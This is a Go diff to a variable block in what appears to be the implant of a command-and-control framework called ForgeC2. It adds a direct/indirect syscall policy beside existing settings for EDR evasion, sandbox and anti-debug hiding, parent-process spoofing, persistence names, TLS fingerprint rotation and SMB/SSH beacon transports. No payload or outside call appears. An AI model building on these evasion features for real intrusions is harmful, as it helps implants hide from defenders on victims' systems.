@@ -78,16 +78,24 @@ var (
 	ParameterNamesStr       string            = ""                            // v2 query param name pool, newline-joined
 	ExpiryDateStr           string            = ""                            // Compile-time expiry date: "YYYY-MM-DD" — implant auto-exits after this date
 	EvasionStr              string            = "false"                       // Compile-time EDR evasion (chunked sleep); also FORGEC2_EVASION=1 at runtime
+	SyscallPolicyStr        string            = "false"                       // Direct/indirect syscall policy; independent of sleep-mask opt-in. also FORGEC2_SYSCALL_POLICY=1 at runtime
 	GhostModeStr            string            = "false"                       // Compile-time ghost protocol (sandbox/anti-debug deep-hiding); also FORGEC2_GHOST_MODE=1 at runtime
-	PPIDSpoofStr            string            = "false"                       // Compile-time PPID spoofing (spawned processes inherit the configured parent as parent)
-	PPIDSpoofParent         string            = "explorer.exe"                // Parent process name used for PPID spoofing (e.g. explorer.exe, svchost.exe, runtimebroker.exe)
+	PPIDSpoofStr            string            = "false"                       // Compile-time PPID spoofing
+	PPIDSpoofParent         string            = "explorer.exe"                // Parent process name used for PPID spoofing
 	PersistencePrefixStr    string            = ""                            // Custom prefix for persistence artifacts (reg keys, task names, file names); default "ForgeC2"
 	BeaconTransportStr      string            = "http"                        // "http", "wss", "ssh" — transport protocol for beacon
 	ChameleonStr            string            = "false"                       // per-dial uTLS JA3 rotation (off = stable Chrome Auto); also FORGEC2_CHAMELEON=1 at runtime
 	ChameleonProfileStr     string            = "random"                      // chrome|firefox|safari|edge|ios|android|360|qq|random or a full utls profile name; also FORGEC2_CHAMELEON_PROFILE at runtime
 	SMBPipeName             string            = ""                            // named pipe name for SMB transport (defaults to persistencePrefix)
 	IsSMBParentStr          string            = "false"                       // "true" = this agent is an SMB parent (listens on pipe)
-	SSHUserStr              string            = ""                            // SSH username for SSH transport (defaults to persistencePrefix)
+
+	// Runtime state for the independent syscall policy (option B): shared with
+	// syscall_policy_windows.go so startup resolution is testable and observable.
+	syscallPolicyEnabled   bool                // runtime: syscall policy engaged (parsed from SyscallPolicyStr / FORGEC2_SYSCALL_POLICY)
+	syscallPolicyResolved  bool                // runtime: startup resolution completed
+	syscallPolicySource    string            // runtime: ntdll file the table was resolved from
+	syscallPolicyFailed    []string          // runtime: required syscalls that failed to resolve
+	SSHUserStr             string            = ""                            // SSH username for SSH transport (defaults to persistencePrefix)
 	SSHPasswordStr          string            = ""                            // SSH password for SSH transport
 	SSHKeyStr               string            = ""                            // base64-encoded PEM private key for SSH transport
 	SSHHostKeyStr           string            = ""                            // base64 server host public key (pin); empty = SSH transport refuses to connect
